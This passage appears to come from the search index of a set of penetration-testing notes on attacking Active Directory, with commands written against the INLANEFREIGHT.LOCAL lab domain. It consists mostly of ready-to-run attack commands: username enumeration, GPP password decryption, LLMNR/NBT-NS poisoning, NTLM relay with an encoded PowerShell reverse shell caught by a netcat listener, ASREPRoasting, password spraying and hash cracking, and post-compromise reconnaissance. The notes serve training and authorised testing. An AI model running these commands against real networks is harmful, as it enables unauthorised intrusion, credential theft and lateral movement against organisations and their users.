If creds\n$ crackmapexec smb 172.16.5.5 -u &lt;username&gt; -p &lt;password&gt; --users &gt;&gt; user.txt\n$ awk '{ print $5 }' users.txt | cut -d'\\' -f2 &gt;&gt; validusers.txt\n</code></pre>"},{"location":"zNew/ActiveDirectory/01-NoCredentials/FindUsernameList/#gathering-users-with-ldap-anonymous","title":"Gathering Users with LDAP Anonymous","text":""},{"location":"zNew/ActiveDirectory/01-NoCredentials/FindUsernameList/#using-ldapsearch","title":"Using ldapsearch","text":"<pre><code>$ ldapsearch -h 172.16.5.5 -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"(&amp;(objectclass=user))\"  | grep sAMAccountName: | cut -f2 -d\" \"\n</code></pre>"},{"location":"zNew/ActiveDirectory/01-NoCredentials/FindUsernameList/#using-windapsearch","title":"Using windapsearch","text":"<pre><code>$ ./windapsearch.py --dc-ip 172.16.5.5 -u \"\" -U\n</code></pre>"},{"location":"zNew/ActiveDirectory/01-NoCredentials/FindUsernameList/#enumerating-users-with-kerbrute","title":"Enumerating Users with Kerbrute","text":"<pre><code>$ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users\n\ngrep -o '[a-zA-Z0-9._%+-]\\+@[a-zA-Z0-9.-]\\+\\.[a-zA-Z]\\{2,6\\}' kerb.txt\ncut -d \"@\" -f 1 your_file.txt\n</code></pre> <p>If we are unable to create a valid username list using any of the methods highlighted above, we could turn back to external information gathering and search for company email addresses or use a tool such as linkedin2username to mash up possible usernames from a company's LinkedIn page.</p>"},{"location":"zNew/ActiveDirectory/01-NoCredentials/LowHanging/","title":"LowHanging","text":""},{"location":"zNew/ActiveDirectory/01-NoCredentials/LowHanging/#eternalblue","title":"EternalBlue","text":"<pre><code>exploit /windows/smb/ms17_010_eternalblue\n</code></pre>"},{"location":"zNew/ActiveDirectory/01-NoCredentials/LowHanging/#credentials-in-smb-shares-and-sysvol-scripts","title":"Credentials in SMB Shares and SYSVOL Scripts","text":"<p>The SYSVOL share can be a treasure trove of data, especially in large organizations. We may find many different batch, VBScript, and PowerShell scripts within the scripts directory, which is readable by all authenticated users in the domain. It is worth digging around this directory to hunt for passwords stored in scripts. Sometimes we will find very old scripts containing since disabled accounts or old passwords, but from time to time, we will strike gold, so we should always dig through this directory. Here, we can see an interesting script named reset_local_admin_pass.vbs.</p>"},{"location":"zNew/ActiveDirectory/01-NoCredentials/LowHanging/#discovering","title":"Discovering","text":"<pre><code>PS &gt; ls \\\\academy-ea-dc01\\SYSVOL\\INLANEFREIGHT.LOCAL\\scripts\n</code></pre>"},{"location":"zNew/ActiveDirectory/01-NoCredentials/LowHanging/#group-policy-preferences-gpp-passwords","title":"Group Policy Preferences (GPP) Passwords","text":"<p>When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:</p> <ul> <li>Map drives (drives.xml)</li> <li>Create local users</li> <li>Create printer config files (printers.xml)</li> <li>Creating and updating services (services.xml)</li> <li>Creating scheduled tasks (scheduledtasks.xml)</li> <li>Changing local admin passwords.</li> <li>These files can contain an array of configuration data and defined passwords. The cpassword attribute value is AES-256 bit encrypted, but Microsoft published the AES private key on MSDN, which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.</li> </ul> <p>This was patched in 2014 MS14-025 Vulnerability in GPP could allow elevation of privilege, to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.</p>"},{"location":"zNew/ActiveDirectory/01-NoCredentials/LowHanging/#decrypting-the-password-with-gpp-decrypt","title":"Decrypting the Password with gpp-decrypt","text":"<pre><code>$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE\n</code></pre> <p>GPP passwords can be located by searching or manually browsing the SYSVOL share or using tools such as Get-GPPPassword.ps1, the GPP Metasploit Post Module, and other Python/Ruby scripts which will locate the GPP and return the decrypted cpassword value. CrackMapExec also has two modules for locating and retrieving GPP passwords. One quick tip to consider during engagements: Often, GPP passwords are defined for legacy accounts, and you may therefore retrieve and decrypt the password for a locked or deleted account. However, it is worth attempting to password spray internally with this password (especially if it is unique). Password re-use is widespread, and the GPP password combined with password spraying could result in further access.</p>"},{"location":"zNew/ActiveDirectory/01-NoCredentials/LowHanging/#locating-retrieving-gpp-passwords-with-crackmapexec","title":"Locating &amp; Retrieving GPP Passwords with CrackMapExec","text":"<pre><code>$ crackmapexec smb -L | grep gpp\n</code></pre>"},{"location":"zNew/ActiveDirectory/01-NoCredentials/Poisoning/","title":"LLMNR/NBT-NS Poisoning","text":"<p>Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. It uses port 5355 over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port 137 over UDP.</p> <p>The kicker here is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply. This is where we come in with Responder to poison these requests. With network access, we can spoof an authoritative name resolution source ( in this case, a host that's supposed to belong in the network segment ) in the broadcast domain by responding to LLMNR and NBT-NS traffic as if they have an answer for the requesting host. This poisoning effort is done to get the victims to communicate with our system by pretending that our rogue system knows the location of the requested host. If the requested host requires name resolution or authentication actions, we can capture the NetNTLM hash and subject it to an offline brute force attack in an attempt to retrieve the cleartext password. The captured authentication request can also be relayed to access another host or used against a different protocol (such as LDAP) on the same host. LLMNR/NBNS spoofing combined with a lack of SMB signing can often lead to administrative access on hosts within a domain. SMB Relay attacks will be covered in a later module about Lateral Movement.</p>"},{"location":"zNew/ActiveDirectory/01-NoCredentials/Poisoning/#responder-httpsgithubcomlgandxresponder","title":"Responder [https://github.com/lgandx/Responder]","text":"<pre><code>$ sudo responder -I ens224 \n$ sudo responder -I ens224 -w -d\n</code></pre> <p>/usr/share/responder/logs</p>"},{"location":"zNew/ActiveDirectory/01-NoCredentials/Poisoning/#inveigh-httpsgithubcomkevin-robertsoninveighblobmasterinveighps1","title":"Inveigh [https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1]","text":"<p>If we end up with a Windows host as our attack box, our client provides us with a Windows box to test from, or we land on a Windows host as a local admin via another attack method and would like to look to further our access, the tool Inveigh works similar to Responder</p> <pre><code>PS &gt; Import-Module .\\Inveigh.ps1\nPS &gt; (Get-Command Invoke-Inveigh).Parameters\n\nPS &gt; Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y\n</code></pre>"},{"location":"zNew/ActiveDirectory/01-NoCredentials/Poisoning/#c-inveigh-inveighzero-httpsgithubcomkevin-robertsoninveightreemaster","title":"C# Inveigh (InveighZero) [https://github.com/Kevin-Robertson/Inveigh/tree/master]","text":"<p>Press ESC to enter/exit help</p> <pre><code>PS &gt; .\\Inveigh.exe\n</code></pre> <p>If a NTLM hash is found, next step will be to crack it offline using hashcat.</p>"},{"location":"zNew/ActiveDirectory/01-NoCredentials/Poisoning/#cracking-an-ntlmv2-hash-with-hashcat","title":"Cracking an NTLMv2 Hash With Hashcat**","text":"<pre><code>$ hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt \n</code></pre>"},{"location":"zNew/ActiveDirectory/01-NoCredentials/Poisoning/#relay","title":"Relay","text":"<p>If we cannot crack the hash, we can potentially relay the captured hash to another machine using impacket-ntlmrelayx or Responder MultiRelay.py. Let us see an example using impacket-ntlmrelayx.</p> <p>First, we need to set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf).</p> <pre><code>$ cat /etc/responder/Responder.conf | grep 'SMB ='\n</code></pre> <pre><code>$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146\n\n$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e &lt;revshell&gt; '\n\n$ nc -lvnp 9001\n</code></pre>"},{"location":"zNew/ActiveDirectory/02-ClearTextPasswordOrValidUsernames/ASREPRoasting/","title":"ASREPRoasting","text":"<p>It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the Do not require Kerberos pre-authentication setting enabled. Many vendor installation guides specify that their service account be configured in this way. The authentication service reply (AS_REP) is encrypted with the account\u2019s password, and any domain user can request it.</p> <p>With pre-authentication, a user enters their password, which encrypts a time stamp. The Domain Controller will decrypt this to validate that the correct password was used. If successful, a TGT will be issued to the user for further authentication requests in the domain. If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller. This can be subjected to an offline password attack using a tool such as Hashcat or John the Ripper.</p> <p>ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. This setting can be enumerated with PowerView or built-in tools such as the PowerShell AD module. The attack itself can be performed with the Rubeus toolkit and other tools to obtain the ticket for the target account. If an attacker has GenericWrite or GenericAll permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling the attribute again. Like Kerberoasting, the success of this attack depends on the account having a relatively weak password.</p> <p>Below is an example of the attack. PowerView can be used to enumerate users with their UAC value set to DONT_REQ_PREAUTH.</p> <p>Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser</p> <pre><code>PS &gt; Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl\n</code></pre> <p>With this information in hand, the Rubeus tool can be leveraged to retrieve the AS-REP in the proper format for offline hash cracking. This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth. We will see an example of this using Kerbrute later in this section. Remember, add the /nowrap flag so the ticket is not column wrapped and is retrieved in a format that we can readily feed into Hashcat.</p> <p>Retrieving AS-REP in Proper Format using Rubeus</p> <pre><code>PS &gt; .\\Rubeus.exe asreproast /user:&lt;USERNAME&gt; /nowrap /format:&lt;hashcat|john&gt; /outfile:&lt;output_hashes_file&gt;\n</code></pre> <p>When performing user enumeration with Kerbrute, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.</p>"},{"location":"zNew/ActiveDirectory/02-ClearTextPasswordOrValidUsernames/ASREPRoasting/#retrieving-the-as-rep-using-kerbrute","title":"Retrieving the AS-REP Using Kerbrute","text":"<pre><code>$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt \n</code></pre> <p>With a list of valid users, we can use Get-NPUsers.py from the Impacket toolkit to hunt for all users with Kerberos pre-authentication not required. The tool will retrieve the AS-REP in Hashcat format for offline cracking for any found. We can also feed a wordlist such as jsmith.txt into the tool, it will throw errors for users that do not exist, but if it finds any valid ones without Kerberos pre-authentication, then it can be a nice way to obtain a foothold or further our access, depending on where we are in the course of our assessment. Even if we are unable to crack the AS-REP using Hashcat it is still good to report this as a finding to clients (just lower risk if we cannot crack the password) so they can assess whether or not the account requires this setting.</p>"},{"location":"zNew/ActiveDirectory/02-ClearTextPasswordOrValidUsernames/ASREPRoasting/#hunting-for-users-with-kerberoast-pre-auth-not-required","title":"Hunting for Users with Kerberoast Pre-auth Not Required","text":"<pre><code>$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users \n\n# check ASREPRoast for all domain users (credentials required)\n$ python GetNPUsers.py &lt;domain_name&gt;/&lt;domain_user&gt;:&lt;domain_user_password&gt; -request -format &lt;AS_REP_responses_format [hashcat | john]&gt; -outputfile &lt;output_AS_REP_responses_file&gt;\n\n# check ASREPRoast for a list of users (no credentials required)\n$ python GetNPUsers.py &lt;domain_name&gt;/ -usersfile &lt;users_file&gt; -format &lt;AS_REP_responses_format [hashcat | john]&gt; -outputfile &lt;output_AS_REP_responses_file&gt;\n</code></pre> <p>We have now covered a few ways that we can perform an ASREPRoasting attack from both Windows and Linux hosts and witnessed how we do not need to be on a domain-joined host to a) enumerate accounts that do not require Kerberos pre-authentication and b) perform this attack and obtain an AS-REP to crack offline to either gain a foothold in the domain or further our access.</p>"},{"location":"zNew/ActiveDirectory/02-ClearTextPasswordOrValidUsernames/ASREPRoasting/#cracking-the-hash-offline-with-hashcat","title":"Cracking the Hash Offline with Hashcat","text":"<pre><code>$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt \n</code></pre>"},{"location":"zNew/ActiveDirectory/02-ClearTextPasswordOrValidUsernames/PasswordSpraying/","title":"Enumerating the Password Policy","text":"<p>With valid domain credentials, the password policy can also be obtained remotely using tools such as CrackMapExec or rpcclient.</p>"},{"location":"zNew/ActiveDirectory/02-ClearTextPasswordOrValidUsernames/PasswordSpraying/#linux","title":"Linux","text":"<pre><code>$ crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol\n</code></pre>"},{"location":"zNew/ActiveDirectory/02-ClearTextPasswordOrValidUsernames/PasswordSpraying/#smb-null-sessions","title":"SMB NULL Sessions","text":"<p>SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. SMB NULL session misconfigurations are often the result of legacy Domain Controllers being upgraded in place, ultimately bringing along insecure configurations, which existed by default in older versions of Windows Server.</p> <p>Using rpcclient</p> <pre><code>$ rpcclient -U \"\" -N 172.16.5.5\nrpcclient $&gt; querydominfo\n</code></pre> <p>Using enum4linux</p> <pre><code>$ enum4linux -P 172.16.5.5\n</code></pre> <p>Using enum4linux-ng</p> <pre><code>$ enum4linux-ng -P 172.16.5.5 -oA ilfreight\n\n$ cat ilfreight.json \n</code></pre> <p>LDAP Anonymous Bind</p> <pre><code>$ ldapsearch -h 172.16.5.5 -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"*\" | grep -m 1 -B 10 pwdHistoryLength\n</code></pre>"},{"location":"zNew/ActiveDirectory/02-ClearTextPasswordOrValidUsernames/PasswordSpraying/#windows","title":"Windows","text":""},{"location":"zNew/ActiveDirectory/02-ClearTextPasswordOrValidUsernames/PasswordSpraying/#enumerating-null-session","title":"Enumerating Null Session.","text":"<pre><code>&gt; net use \\\\DC01\\ipc$ \"\" /u:\"\"\n</code></pre>"},{"location":"zNew/ActiveDirectory/02-ClearTextPasswordOrValidUsernames/PasswordSpraying/#using-netexe","title":"Using net.exe","text":"<pre><code>&gt; net accounts\n</code></pre>"},{"location":"zNew/ActiveDirectory/02-ClearTextPasswordOrValidUsernames/PasswordSpraying/#using-powerview","title":"Using PowerView","text":"<pre><code>PS &gt; import-module .\\PowerView.ps1\n&gt; Get-DomainPolicy\n</code></pre>"},{"location":"zNew/ActiveDirectory/02-ClearTextPasswordOrValidUsernames/PasswordSpraying/#password-spraying","title":"Password Spraying","text":"<p>Password spraying can result in gaining access to systems and potentially gaining a foothold on a target network. The attack involves attempting to log into an exposed service using one common password and a longer list of usernames or email addresses. The usernames and emails may have been gathered during the OSINT phase of the penetration test or our initial enumeration attempts. Remember that a penetration test is not static, but we are constantly iterating through several techniques and repeating processes as we uncover new data. Often we will be working in a team or executing multiple TTPs at once to utilize our time effectively. As we progress through our career, we will find that many of our tasks like scanning, attempting to crack hashes, and others take quite a bit of time. We need to make sure we are using our time effectively and creatively because most assessments are time-boxed. So while we have our poisoning attempts running, we can also utilize the info we have to attempt to gain access via Password Spraying. Now let's cover some of the considerations for Password spraying and how to make our target list from the information we have.</p>"},{"location":"zNew/ActiveDirectory/02-ClearTextPasswordOrValidUsernames/PasswordSpraying/#linux_1","title":"Linux","text":"<p>Now that we have created a wordlist using one of the methods outlined in the previous sections, it\u2019s time to execute our attack. The following sections will let us practice Password Spraying from Linux and Windows hosts. This is a key focus for us as it is one of two main avenues for gaining domain credentials for access, but one that we also must proceed with cautiously.</p>"},{"location":"zNew/ActiveDirectory/02-ClearTextPasswordOrValidUsernames/PasswordSpraying/#using-a-bash-one-liner","title":"Using a Bash one-liner","text":"<pre><code>$for u in $(cat valid_users.txt);do rpcclient -U \"$u%Welcome1\" -c \"getusername;quit\" 172.16.5.5 | grep Authority; done\n</code></pre>"},{"location":"zNew/ActiveDirectory/02-ClearTextPasswordOrValidUsernames/PasswordSpraying/#using-kerbrute","title":"Using Kerbrute","text":"<pre><code>$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1\n</code></pre>"},{"location":"zNew/ActiveDirectory/02-ClearTextPasswordOrValidUsernames/PasswordSpraying/#using-crackmapexec","title":"Using CrackMapExec","text":"<pre><code>$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +\n</code></pre> <p>Validating the Credentials with CrackMapExec</p> <pre><code>$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123\n</code></pre> <p>Local Administrator Password Reuse</p> <pre><code>$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +\n</code></pre>"},{"location":"zNew/ActiveDirectory/02-ClearTextPasswordOrValidUsernames/PasswordSpraying/#windows_1","title":"Windows","text":""},{"location":"zNew/ActiveDirectory/02-ClearTextPasswordOrValidUsernames/PasswordSpraying/#using-domainpasswordsprayps1","title":"Using DomainPasswordSpray.ps1","text":"<pre><code>PS &gt; Import-Module .\\DomainPasswordSpray.ps1\nPS &gt; Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/","title":"Credentialed Enumeration","text":""},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#linux","title":"Linux","text":""},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#crackmapexec-httpsgithubcombyt3bl33d3rcrackmapexec","title":"CrackMapExec [https://github.com/byt3bl33d3r/CrackMapExec]","text":"<pre><code>$ crackmapexec -h\n</code></pre> <p>MSSQL, SMB, SSH, and WinRM credentials</p> <p>CME Options (SMB)</p> <pre><code>$ crackmapexec smb -h\n</code></pre> <p>CME - Domain User Enumeration We start by pointing CME at the Domain Controller.</p> <pre><code>$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users\n$ awk -F 'INLANEFREIGHT.LOCAL\\\\\\\\' '{print $2}' crack.txt | awk '{print $1}' &gt; new_crack.txt\n\n$ crackmapexec smb 172.16.5.5 -u &lt;username&gt; -p &lt;password&gt; --users &gt;&gt; user.txt\n$ awk '{ print $5 }' users.txt | cut -d'\\' -f2 &gt;&gt; validusers.txt\n</code></pre> <p>CME - Domain Group Enumeration</p> <pre><code>$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups\n</code></pre> <p>CME - Logged On Users local admin because (Pwn3d!)</p> <pre><code>$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users\n</code></pre> <p>CME Share Searching</p> <pre><code>$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares\n</code></pre> <p>Spider_plus</p> <pre><code>$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#smbmap-httpsgithubcomshawndevanssmbmap","title":"SMBMap [https://github.com/ShawnDEvans/smbmap]","text":"<p>SMBMap To Check Access</p> <pre><code>$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5\n</code></pre> <p>Recursive List Of All Directories</p> <pre><code>$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#rpcclient-httpswwwsambaorgsambadocscurrentman-htmlrpcclient1html","title":"rpcclient [https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html]","text":"<pre><code>$ rpcclient -U \"\" -N 172.16.5.5\n</code></pre> <p>Enumdomusers</p> <pre><code>rpcclient $&gt; enumdomusers\n</code></pre> <p>RPCClient User Enumeration By RID</p> <pre><code>rpcclient $&gt; queryuser 0x457\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#windapsearch","title":"Windapsearch","text":"<p>Domain Admins</p> <pre><code>$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da\n</code></pre> <p>Privileged Users</p> <pre><code>$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#bloodhoundpy-httpsgithubcomfox-itbloodhoundpy","title":"Bloodhound.py [https://github.com/fox-it/BloodHound.py]","text":"<p>Once we have domain credentials, we can run the BloodHound.py BloodHound ingestor from our Linux attack host. BloodHound is one of, if not the most impactful tools ever released for auditing Active Directory security, and it is hugely beneficial for us as penetration testers. We can take large amounts of data that would be time-consuming to sift through and create graphical representations or \"attack paths\" of where access with a particular user may lead. We will often find nuanced flaws in an AD environment that would have been missed without the ability to run queries with the BloodHound GUI tool and visualize issues. The tool uses graph theory to visually represent relationships and uncover attack paths that would have been difficult, or even impossible to detect with other tools. The tool consists of two parts: the SharpHound collector written in C# for use on Windows systems, or for this section, the BloodHound.py collector (also referred to as an ingestor) and the BloodHound GUI tool which allows us to upload collected data in the form of JSON files. Once uploaded, we can run various pre-built queries or write custom queries using Cypher language. The tool collects data from AD such as users, groups, computers, group membership, GPOs, ACLs, domain trusts, local admin access, user sessions, computer and user properties, RDP access, WinRM access, etc.</p> <pre><code>$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all \n</code></pre> <p>Upload the Zip File into the BloodHound GUI</p> <pre><code>$ sudo neo4j start (kali:neo4j, neo4j:kali)\n$ zip -r ilfreight_bh.zip *.json\n\n$ bloodhound \n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#windows","title":"Windows","text":""},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#activedirectory-powershell-module","title":"ActiveDirectory PowerShell Module","text":"<pre><code>PS &gt; Get-Module\n</code></pre> <p>Load ActiveDirectory Module</p> <pre><code>PS &gt; Import-Module ActiveDirectory\n</code></pre> <p>Group Enumeration</p> <pre><code>PS &gt; Get-ADGroup -Filter * | select name\n</code></pre> <p>Detailed Group Info</p> <pre><code>PS &gt; Get-ADGroup -Identity \"Backup Operators\"\n</code></pre> <p>Group Membership</p> <pre><code>PS &gt; Get-ADGroupMember -Identity \"Backup Operators\"\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#powerview-httpsgithubcompowershellmafiapowersploitblobmasterreconpowerviewps1","title":"PowerView [https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1]","text":"<p>Domain User Information</p> <pre><code>PS &gt; Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol\n</code></pre> <p>Recursive Group Membership</p> <pre><code>PS &gt;  Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse\n</code></pre> <p>We can use the Test-AdminAccess function to test for local admin access on either the current machine or a remote one. Testing for Local Admin Access</p> <pre><code>PS C:\\htb&gt; Test-AdminAccess -ComputerName ACADEMY-EA-MS01\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#finding-users-with-spn-set","title":"Finding Users With SPN Set","text":"<pre><code>PS C:\\htb&gt; Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#sharpview-httpsgithubcomdmchellsharpview","title":"SharpView [https://github.com/dmchell/SharpView]","text":"<pre><code>PS C:\\htb&gt; .\\SharpView.exe Get-DomainUser -Identity forend\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#snaffler-httpsgithubcomsnaffconsnaffler","title":"Snaffler [https://github.com/SnaffCon/Snaffler]","text":"<p>Snaffler is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. Snaffler works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories. Once that is done, it iterates through any directories readable by our user and hunts for files that could serve to better our position within the assessment. Snaffler requires that it be run from a domain-joined host or in a domain-user context.</p> <pre><code>PS C:\\htb&gt; .\\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#bloodhound-httpsgithubcombloodhoundadbloodhound","title":"BloodHound [https://github.com/BloodHoundAD/BloodHound]","text":""},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#sharphound-httpsgithubcombloodhoundadbloodhoundtreemastercollectors","title":"SharpHound [https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors]","text":"<pre><code>PS C:\\htb&gt; .\\SharpHound.exe -c All --zipfilename ILFREIGHT\nPS C:\\htb&gt; .\\SharpHound.exe -c All --zipfilename ILFREIGHT --ldapusername AB920 --ldappassword weasal\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#living-off-the-land","title":"Living Off the Land","text":""},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#quick-checks-using-powershell","title":"Quick Checks Using PowerShell","text":"<pre><code>PS C:\\htb&gt; Get-Module\nPS C:\\htb&gt; Get-ExecutionPolicy -List\nPS C:\\htb&gt; Get-ChildItem Env: | ft key,value\n\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#downgrade-powershell","title":"Downgrade Powershell","text":"<pre><code>PS C:\\htb&gt; Get-host\nPS C:\\htb&gt; powershell.exe -version 2\nPS C:\\htb&gt; Get-host\nPS C:\\htb&gt; get-module\n\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#checking-defenses","title":"Checking Defenses","text":""},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#firewall-checks","title":"Firewall Checks","text":"<pre><code>PS C:\\htb&gt; netsh advfirewall show allprofiles\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#windows-defender-check-from-cmdexe","title":"Windows Defender Check (from CMD.exe)","text":"<pre><code>C:\\htb&gt; sc query windefend\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#get-mpcomputerstatus","title":"Get-MpComputerStatus","text":"<pre><code>PS C:\\htb&gt; Get-MpComputerStatus\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#am-i-alone","title":"Am I Alone?","text":"<p>When landing on a host for the first time, one important thing is to check and see if you are the only one logged in. If you start taking actions from a host someone else is on, there is the potential for them to notice you. If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.</p>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#using-qwinsta","title":"Using qwinsta","text":"<pre><code>PS C:\\htb&gt; qwinsta\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#network-information","title":"Network Information","text":"Networking Commands Description arp -a Lists all known hosts stored in the arp table. ipconfig /all Prints out adapter settings for the host. We can figure out the network segment from here. route print Displays the routing table (IPv4 &amp; IPv6) identifying known networks and layer three routes shared with the host. netsh advfirewall show state Displays the status of the host's firewall. We can determine if it is active and filtering traffic."},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#using-arp-a","title":"Using arp -a","text":"<pre><code>PS C:\\htb&gt; arp -a\n</code></pre>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#viewing-the-routing-table","title":"Viewing the Routing Table","text":"<pre><code>PS C:\\htb&gt; route print\n</code></pre> <p><code>Using arp -a and route print will not only benefit in enumerating AD environments, but will also assist us in identifying opportunities to pivot to different network segments in any environment. These are commands we should consider using on each engagement to assist our clients in understanding where an attacker may attempt to go following initial compromise.</code></p>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#windows-management-instrumentation-wmi","title":"Windows Management Instrumentation (WMI)","text":""},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/CredentialedEnumeration/#quick-wmi-checks","title":"Quick WMI checks","text":"Command Description wmic qfe get Caption,Description,HotFixID,InstalledOn  Prints the patch level and description of the Hotfixes applied wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List Displays basic host information to include any attributes within the list wmic process list /format:list A listing of all processes on host wmic ntdomain list /format:list    Displays information about the Domain and Domain Controllers 